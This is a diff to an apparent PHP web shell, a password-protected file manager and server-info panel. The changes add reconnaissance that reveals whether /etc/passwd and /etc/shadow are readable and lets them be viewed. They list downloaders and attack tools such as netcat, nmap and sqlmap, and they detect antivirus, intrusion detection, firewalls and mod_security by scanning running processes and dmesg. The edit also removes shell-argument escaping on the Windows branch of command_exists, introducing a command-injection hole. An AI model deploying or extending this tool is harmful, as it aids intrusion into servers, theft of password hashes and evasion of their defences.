@@ -329,11 +329,14 @@ function reassembleFileChunks($upload_id, $original_filename, $total_chunks, $ta
 }
 
 function command_exists($command) {
+    if (!is_callable_shell_func('shell_exec')) { return false; }
     $safe_command = escapeshellarg($command);
     if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-        $result = @shell_exec("where " . $safe_command . " 2> NUL");
+        // 'where' is more reliable than 'command -v' on Windows
+        $result = @shell_exec("where " . $command . " 2> NUL");
         return !empty($result);
     } else {
+        // 'command -v' is the POSIX standard
         $result = @shell_exec("command -v " . $safe_command . " 2>/dev/null");
         return !empty($result);
     }
@@ -658,15 +661,17 @@ function generate_breadcrumbs($path) {
 
 function getServerInfoDetails() {
     $info = array();
+    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+    
     $info['Server Software'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A');
     $info['Server Name'] = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A';
     $info['Server Admin'] = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'N/A';
     $info['Server Port'] = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'N/A';
-    // Removed "Document Root" and "Script Filename" as requested.
     $info['PHP Version'] = PHP_VERSION;
     $info['Operating System'] = php_uname();
+    
     $nproc = 'N/A';
-    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+    if (!$is_windows) {
         if (command_exists('nproc')) {
             $nproc_out = trim(@shell_exec('nproc'));
             if(is_numeric($nproc_out)) $nproc = $nproc_out;
@@ -676,8 +681,7 @@ function getServerInfoDetails() {
                 $matches = array();
                 preg_match_all('/^processor\s*:\s*\d+/m', $cpuinfo, $matches);
                 $nproc_count = count($matches[0]);
-                if ($nproc_count > 0) $nproc = $nproc_count;
-                else $nproc = 'N/A (parse failed)';
+                $nproc = $nproc_count > 0 ? $nproc_count : 'N/A (parse failed)';
             }
         }
     } else {
@@ -692,42 +696,79 @@ function getServerInfoDetails() {
         $info['User Info (posix)'] = ($userInfo ? $userInfo['name'] : 'N/A') . ' (UID: ' . $UID . ', GID: ' . ($userInfo ? $userInfo['gid'] : posix_getgid()) . ')';
     }
 
-    // --- START: Added Features ---
-    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+    // --- START: MODIFIED/ENHANCED Features ---
+    if (!$is_windows) {
         $passwd_path = '/etc/passwd';
-        if (@is_readable($passwd_path)) {
-            $info['Readable /etc/passwd'] = '<span style="color:lime;">Yes</span> <a href="#" onclick="openModalWithFile(\'/etc/passwd\', \'passwd\'); return false;" style="color:#0ff; text-decoration:none;">[view]</a>';
-        } else {
-            $info['Readable /etc/passwd'] = '<span style="color:red;">No</span>';
-        }
+        $info['Readable /etc/passwd'] = @is_readable($passwd_path) ?
+            '<span style="color:lime;">Yes</span> <a href="#" onclick="openModalWithFile(\'/etc/passwd\', \'passwd\'); return false;" style="color:#0ff; text-decoration:none;">[view]</a>' :
+            '<span style="color:red;">No</span>';
 
         $shadow_path = '/etc/shadow';
-        if (@is_readable($shadow_path)) {
-            $info['Readable /etc/shadow'] = '<span style="color:lime;">Yes</span> <a href="#" onclick="openModalWithFile(\'/etc/shadow\', \'shadow\'); return false;" style="color:#0ff; text-decoration:none;">[view]</a>';
-        } else {
-            $info['Readable /etc/shadow'] = '<span style="color:red;">No</span>';
-        }
+        $info['Readable /etc/shadow'] = @is_readable($shadow_path) ?
+            '<span style="color:lime;">Yes</span> <a href="#" onclick="openModalWithFile(\'/etc/shadow\', \'shadow\'); return false;" style="color:#0ff; text-decoration:none;">[view]</a>' :
+            '<span style="color:red;">No</span>';
     } else {
         $info['Readable /etc/passwd'] = 'N/A (Linux specific)';
         $info['Readable /etc/shadow'] = 'N/A (Linux specific)';
     }
 
-    $downloader_tools = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
-    $useful_tools = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
-    $danger_tools = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');
-
+    // Dynamic "Downloaders" Scan
     $found_downloaders = array();
-    foreach ($downloader_tools as $tool) { if (command_exists($tool)) { $found_downloaders[] = $tool; } }
+    $downloader_cmds = array('wget', 'curl', 'fetch', 'lynx', 'links', 'aria2c');
+    foreach ($downloader_cmds as $cmd) { if (command_exists($cmd)) $found_downloaders[] = $cmd; }
+    if (ini_get('allow_url_fopen')) $found_downloaders[] = 'PHP: file_get_contents';
+    if (extension_loaded('curl')) $found_downloaders[] = 'PHP: cURL';
     $info['Downloaders'] = !empty($found_downloaders) ? implode(', ', $found_downloaders) : 'None found';
-
+    
+    // Dynamic "Useful" Scan
     $found_useful = array();
-    foreach ($useful_tools as $tool) { if (command_exists($tool)) { $found_useful[] = $tool; } }
+    $useful_cmds = array('gcc', 'g++', 'make', 'git', 'svn', 'htop', 'iotop', 'python', 'perl', 'ruby', 'node', 'java', 'tar', 'unzip', 'zip', 'gzip', 'bzip2', 'locate', 'nmap', 'masscan', 'sqlmap', 'socat', 'netcat', 'nc', 'docker', 'kubectl');
+    $package_managers = array('apt', 'yum', 'apk', 'pacman', 'dnf');
+    foreach (array_merge($useful_cmds, $package_managers) as $cmd) { if (command_exists($cmd)) $found_useful[] = $cmd; }
     $info['Useful'] = !empty($found_useful) ? implode(', ', $found_useful) : 'None found';
-
+    
+    // Dynamic "Danger" (Security) Scan
     $found_danger = array();
-    foreach ($danger_tools as $tool) { if (command_exists($tool)) { $found_danger[] = $tool; } }
-    $info['Danger'] = !empty($found_danger) ? implode(', ', $found_danger) : 'None found';
-    // --- END: Added Features ---
+    if (!$is_windows && is_callable_shell_func('shell_exec')) {
+        $ps_output = @shell_exec('ps aux');
+        $dmesg_output = @shell_exec('dmesg');
+        
+        $danger_keywords = array(
+            // AV
+            'clamd', 'clamav', 'freshclam', 'avg', 'kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'sophos',
+            // Rootkit
+            'rkhunter', 'chkrootkit',
+            // HIDS/NIDS
+            'ossec', 'wazuh', 'tripwire', 'aide', 'snort', 'suricata', 'bro', 'zeek',
+            // Firewall
+            'iptables', 'ufw', 'firewalld', 'ipfw', 'shorewall', 'portsentry',
+            // Hardening
+            'fail2ban', 'denyhosts', 'lidsadm', 'grsecurity', 'pax', 'selinux', 'apparmor',
+            // Log Analysis
+            'logwatch', 'logcheck'
+        );
+        foreach ($danger_keywords as $keyword) { if (stripos($ps_output, $keyword) !== false) $found_danger[] = $keyword . ' (process)'; }
+        
+        if (stripos($dmesg_output, 'SELinux') !== false) $found_danger[] = 'SELinux (kernel)';
+        if (stripos($dmesg_output, 'AppArmor') !== false) $found_danger[] = 'AppArmor (kernel)';
+        if (stripos($dmesg_output, 'grsecurity') !== false) $found_danger[] = 'grsecurity (kernel)';
+        
+        if (@is_readable('/etc/rkhunter.conf') || @is_dir('/etc/rkhunter')) $found_danger[] = 'rkhunter (config)';
+        if (@is_readable('/etc/chkrootkit.conf')) $found_danger[] = 'chkrootkit (config)';
+        if (@is_dir('/var/ossec') || @is_dir('/etc/ossec')) $found_danger[] = 'ossec/wazuh (config)';
+        
+        // WAF Check
+        if (function_exists('apache_get_modules') && in_array('mod_security2', apache_get_modules())) {
+            $found_danger[] = 'mod_security (Apache)';
+        } elseif (command_exists('httpd') && stripos(@shell_exec('httpd -M 2>/dev/null'), 'security2_module') !== false) {
+             $found_danger[] = 'mod_security (Apache)';
+        } elseif (command_exists('apache2ctl') && stripos(@shell_exec('apache2ctl -M 2>/dev/null'), 'security2_module') !== false) {
+             $found_danger[] = 'mod_security (Apache)';
+        }
+    }
+    if (extension_loaded('suhosin')) $found_danger[] = 'suhosin (PHP)';
+    $info['Danger'] = !empty($found_danger) ? implode(', ', array_unique($found_danger)) : 'None detected';
+    // --- END: MODIFIED/ENHANCED Features ---
 
     $safe_mode_val = ini_get('safe_mode');
     if(is_string($safe_mode_val) && strtolower($safe_mode_val) === "off") $safe_mode_val = 0;
@@ -785,7 +826,7 @@ function getServerInfoDetails() {
     $info['Allow URL Fopen'] = ini_get('allow_url_fopen') ? '<span style="color:orange;">ON</span>' : '<span style="color:lime;">OFF</span>';
     $info['Allow URL Include'] = ini_get('allow_url_include') ? '<span style="color:red;">ON (Dangerous)</span>' : '<span style="color:lime;">OFF</span>';
 
-    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+    if (!$is_windows) {
         $named_conf_path = '/etc/named.conf';
         if (@is_readable($named_conf_path)) {
             $info['Domains Config (/etc/named.conf)'] = '<span style="color:lime;">Readable</span>';
@@ -797,7 +838,7 @@ function getServerInfoDetails() {
     }
 
     $network_interface_output = 'Could not execute network interface command or command not found.';
-    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+    if (!$is_windows) {
         if(command_exists('ip')) { $network_interface_output = @shell_exec('ip addr'); }
         elseif (command_exists('ifconfig')) { $network_interface_output = @shell_exec('ifconfig'); }
     } else {
@@ -1311,6 +1352,16 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             if (isset($_POST['path']) && isset($_POST['content'])) {
                 $filePath = $_POST['path'];
                 $dirPath = dirname($filePath);
+                 
+                // Allow saving only within the script's directory for safety
+                $real_base_path = realpath(__DIR__);
+                $real_file_path = realpath($filePath);
+                $real_dir_path = $real_file_path ? dirname($real_file_path) : realpath($dirPath);
+
+                if (strpos($real_dir_path, $real_base_path) !== 0) {
+                     $response['message'] = '[Error] Security check failed: Cannot write outside of the script directory.';
+                     break;
+                }
 
                 if (!is_dir($dirPath)) {
                     if (!@mkdir($dirPath, 0755, true)) {
@@ -1840,15 +1891,6 @@ endif;
                 <thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Owner/Group</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
                 <tbody id="file-listing"><tr><td colspan="7" style="text-align:center;">Loading...</td></tr></tbody>
             </table>
-            <div id="upload-modal">
-                <div>
-                    <h3 id="upload-modal-title">File Upload Progress</h3>
-                    <div id="upload-progress-container"></div>
-                    <div class="button-bar" style="margin-top: 10px; justify-content: flex-end;">
-                        <button id="close-upload-modal-btn" class="inputzbut" style="background:#555;">Close</button>
-                    </div>
-                </div>
-            </div>
         </div>
 
         <div id="uncompressor" class="tab-content">
@@ -1908,7 +1950,7 @@ endif;
             <table class="info-table"><?php
                 $server_details = getServerInfoDetails();
                 foreach ($server_details as $k => $v) {
-                    $value_display = (is_string($v) && (strpos($v, '<span style="color:red;">') !== false || strpos($v, '<span style="color:orange;">') !== false || strpos($v, '<span style="color:lime;">') !== false)) ? $v : htmlspecialchars($v);
+                    $value_display = (is_string($v) && (strpos($v, '<span style="color:red;">') !== false || strpos($v, '<span style="color:orange;">') !== false || strpos($v, '<span style="color:lime;">') !== false || strpos($v, '<a href') !== false)) ? $v : htmlspecialchars($v);
                     echo "<tr><td>" . htmlspecialchars($k) . "</td><td>" .
                          (($k === 'Network Interfaces (attempt)' || $k === 'Disabled Functions' || $k === 'Open Basedir' || $k === 'Include Path' || $k === 'Session Save Path' || $k === 'Downloaders' || $k === 'Useful' || $k === 'Danger')
                             ? "<pre>" . htmlspecialchars($v) . "</pre>"
@@ -2010,19 +2052,28 @@ endif;
                 <p><em>Disclaimer: This tool provides powerful server access. Use responsibly and ensure it is adequately secured. The developer is not responsible for any misuse.</em></p>
             </div>
         </div>
-
-        <div id="file-view-modal"> <div>
-                <h3 id="file-modal-title">View/Edit File</h3>
-                <div id="file-modal-message" class="modal-message hidden"></div>
-                <textarea id="file-content-area"></textarea>
-                <div class="button-bar" style="margin-top: 10px; justify-content: flex-end;">
-                    <button id="save-file-btn" class="inputzbut">Save Changes</button>
-                    <button id="close-modal-btn" class="inputzbut" style="background:#555;">Close</button>
-                </div>
+    </div>
+    
+    <div id="file-view-modal"> <div>
+            <h3 id="file-modal-title">View/Edit File</h3>
+            <div id="file-modal-message" class="modal-message hidden"></div>
+            <textarea id="file-content-area"></textarea>
+            <div class="button-bar" style="margin-top: 10px; justify-content: flex-end;">
+                <button id="save-file-btn" class="inputzbut">Save Changes</button>
+                <button id="close-modal-btn" class="inputzbut" style="background:#555;">Close</button>
             </div>
         </div>
+    </div>
+    <div id="upload-modal">
+        <div>
+            <h3 id="upload-modal-title">File Upload Progress</h3>
+            <div id="upload-progress-container"></div>
+            <div class="button-bar" style="margin-top: 10px; justify-content: flex-end;">
+                <button id="close-upload-modal-btn" class="inputzbut" style="background:#555;">Close</button>
+            </div>
         </div>
-<script>
+    </div>
+    <script>
 document.addEventListener('DOMContentLoaded', function() {
     // --- Element Selectors ---
     const tabs = document.querySelectorAll('.tab-link');
@@ -2409,7 +2460,12 @@ document.addEventListener('DOMContentLoaded', function() {
     // --- File Operations ---
     window.openModalWithFile = (filePath, fileName) => {
         currentEditingFile = filePath;
-        fileModalTitle.textContent = `View/Edit: ${htmlEntities(fileName)}`;
+        const isSystemFile = filePath === '/etc/passwd' || filePath === '/etc/shadow';
+        
+        saveFileBtn.style.display = isSystemFile ? 'none' : 'inline-block';
+        fileContentArea.readOnly = isSystemFile;
+
+        fileModalTitle.textContent = `${isSystemFile ? 'View' : 'View/Edit'}: ${htmlEntities(fileName)}`;
         fileContentArea.value = 'Loading content...';
         hideModalMessage(); fileViewModal.classList.add('visible');
         sendAjaxRequest('get_file_content', { path: filePath }).then(r => {
